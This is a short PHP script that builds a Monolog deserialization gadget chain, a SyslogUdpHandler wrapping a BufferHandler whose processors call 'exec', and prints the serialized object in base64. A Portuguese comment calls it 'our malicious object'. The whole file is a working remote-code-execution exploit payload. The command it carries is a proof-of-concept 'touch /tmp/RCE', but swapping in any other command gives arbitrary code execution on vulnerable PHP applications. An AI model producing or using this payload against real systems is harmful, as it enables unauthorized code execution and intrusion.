<?php

namespace Monolog\Handler;

class BufferHandler
{
    protected $handler;
    protected $bufferSize = 1;
    protected $bufferLimit = 0;
    protected $flushOnOverflow = false;
    protected $initialized = false;
    protected $level = null;

    protected $buffer = [["touch /tmp/RCE", "level" => null]];
    protected $processors = ["current", "exec"];


    public function __construct()
    {
        $this->handler = clone $this;
    }
}

class SyslogUdpHandler
{
    protected $socket;

    function __construct($x)
    {
        $this->socket = $x;
    }
}


//Construindo nosso objeto malicioso
$o = new SyslogUdpHandler(
    new BufferHandler()
);

echo base64_encode(serialize($o)) . "\n";
